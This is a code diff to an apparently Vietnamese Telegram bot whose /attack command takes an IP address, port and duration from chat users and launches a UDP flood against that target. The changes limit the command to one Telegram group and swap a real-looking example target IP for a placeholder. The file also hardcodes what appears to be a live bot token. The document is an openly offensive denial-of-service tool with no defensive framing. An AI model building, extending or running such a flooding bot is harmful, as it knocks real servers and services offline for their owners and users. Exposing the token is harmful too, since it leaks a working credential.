@@ -6,9 +6,10 @@ import random
 
 # === Cấu hình ===
 TOKEN = "8137622733:AAHJEiP0Wx3Lis7jVUwuBJgfIT29-3MqEqI"
+GROUP_ID = -1002149794790  # Group được phép sử dụng
 bot = telebot.TeleBot(TOKEN)
 
-cooldowns = {}  # Lưu thời gian cooldown của từng user
+cooldowns = {}  # Lưu thời gian sử dụng gần nhất của từng người dùng
 
 # === UDP Attack ===
 def udp_attack(ip, port, duration):
@@ -32,9 +33,13 @@ def start(message):
 def myid(message):
     bot.reply_to(message, f"ID của bạn là: `{message.from_user.id}`\nGroup ID: `{message.chat.id}`", parse_mode='Markdown')
 
-# === /attack (ai cũng dùng được, nhưng giới hạn 5s mỗi lần) ===
+# === /attack handler ===
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
+    if message.chat.id != GROUP_ID:
+        bot.reply_to(message, "Lệnh này chỉ được dùng trong group được cấp phép.")
+        return
+
     user_id = message.from_user.id
     now = time.time()
     last_used = cooldowns.get(user_id, 0)
@@ -45,11 +50,13 @@ def handle_attack(message):
         return
 
     cooldowns[user_id] = now
-    bot.reply_to(message, "Nhập theo cú pháp: `ip port thời_gian`\nVí dụ: `148.153.219.121 10012 900`", parse_mode='Markdown')
+    bot.reply_to(message, "Nhập theo cú pháp: `ip port thời_gian`\nVí dụ: `1.2.3.4 27015 10`", parse_mode='Markdown')
     bot.register_next_step_handler(message, process_attack)
 
-# === Xử lý lệnh attack ===
+# === Xử lý nội dung attack ===
 def process_attack(message):
+    if message.chat.id != GROUP_ID:
+        return
     try:
         ip, port, duration = message.text.strip().split()
         port = int(port)
